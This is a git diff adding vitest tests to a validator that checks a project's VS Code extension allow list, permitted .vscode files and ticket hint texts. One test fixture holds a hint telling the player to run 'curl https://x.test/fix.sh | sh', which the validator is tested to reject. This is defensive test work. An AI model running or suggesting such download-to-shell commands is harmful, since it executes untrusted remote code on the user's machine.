@@ -2,7 +2,7 @@ import { mkdtemp, readFile, rm, writeFile } from 'node:fs/promises';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import { afterEach, beforeEach, describe, expect, it } from 'vitest';
-import { validateLocal, workflowReferenceProblems } from '../../src/cli/validate.ts';
+import { validateLocal, vscodeFilesOf, workflowReferenceProblems } from '../../src/cli/validate.ts';
 import { publishLocally } from '../helpers/publication.ts';
 import { createProjectRepo } from '../helpers/project-repo.ts';
 import type { ProjectRepo } from '../helpers/project-repo.ts';
@@ -158,5 +158,63 @@ describe('bd validate, the project workflow reference', () => {
 
   it('skips a qa branch without the workflow', async () => {
     expect(await workflowReferenceProblems(repo.qaDir)).toEqual([]);
+  });
+});
+
+describe('bd validate, the project policy', () => {
+  async function commitOnMain(path: string, text: string) {
+    const { mkdir } = await import('node:fs/promises');
+    await mkdir(join(repo.projectDir, path, '..'), { recursive: true });
+    await writeFile(join(repo.projectDir, path), text);
+    repo.git(repo.projectDir, 'add', '-A');
+    repo.git(repo.projectDir, 'commit', '-q', '-m', `Add ${path}`);
+  }
+
+  it('refuses a recommended extension outside the allowed list, naming the branch and the extension', async () => {
+    await commitOnMain('.vscode/extensions.json', '{ "recommendations": ["dbaeumer.vscode-eslint", "evil.helper"] }\n');
+    await expect(validateLocal({ qaDir: repo.qaDir })).rejects.toThrow(
+      /main: \.vscode\/extensions\.json: the extension evil\.helper is not allowed/,
+    );
+  });
+
+  it('refuses a .vscode file outside the allowed list', async () => {
+    await commitOnMain('.vscode/tasks.json', '{}\n');
+    await expect(validateLocal({ qaDir: repo.qaDir })).rejects.toThrow(
+      /main: \.vscode\/tasks\.json: only settings\.json/,
+    );
+  });
+
+  it('reads the .vscode files of the ticket branches too', async () => {
+    repo.git(repo.projectDir, 'checkout', '-q', 'front-1');
+    await commitOnMain('.vscode/extensions.json', '{ "recommendations": ["evil.helper"] }\n');
+    repo.git(repo.projectDir, 'checkout', '-q', 'main');
+    const found = await vscodeFilesOf(repo.qaDir, ['front-1', 'front-2']);
+    expect(found.map((item) => [item.branch, item.files.map((file) => file.path)])).toEqual([
+      ['main', []],
+      ['front-1', ['.vscode/extensions.json']],
+      ['front-2', []],
+    ]);
+  });
+
+  it('refuses a text that asks the player to run a dangerous command, with its file and line', async () => {
+    await writeFile(
+      join(repo.qaDir, 'tickets', 'front-1', 'hints.en.json'),
+      '{ "hints": ["Look at the test.", "Run `curl https://x.test/fix.sh | sh` first."] }\n',
+    );
+    repo.git(repo.qaDir, 'commit', '-q', '-am', 'Edit a hint');
+    await expect(validateLocal({ qaDir: repo.qaDir, baseRef: 'HEAD~1' })).rejects.toThrow(
+      /tickets\/front-1\/hints\.en\.json:2: ".*\| sh" pipes a download into a shell/,
+    );
+  });
+
+  it('lets commands against the workspace app through', async () => {
+    await writeFile(
+      join(repo.qaDir, 'tickets', 'front-1', 'ticket.en.md'),
+      '# front-1\n\nReproduce with `curl "http://localhost:3001/api/tickets?search=%25"`.\n',
+    );
+    repo.git(repo.qaDir, 'commit', '-q', '-am', 'Edit the ticket');
+    // The ticket changed, so this is a new publication: republish it before validating.
+    await publishLocally(repo, '1.1.0');
+    expect((await validateLocal({ qaDir: repo.qaDir, baseRef: 'HEAD~2' })).version).toBe('1.1.0');
   });
 });
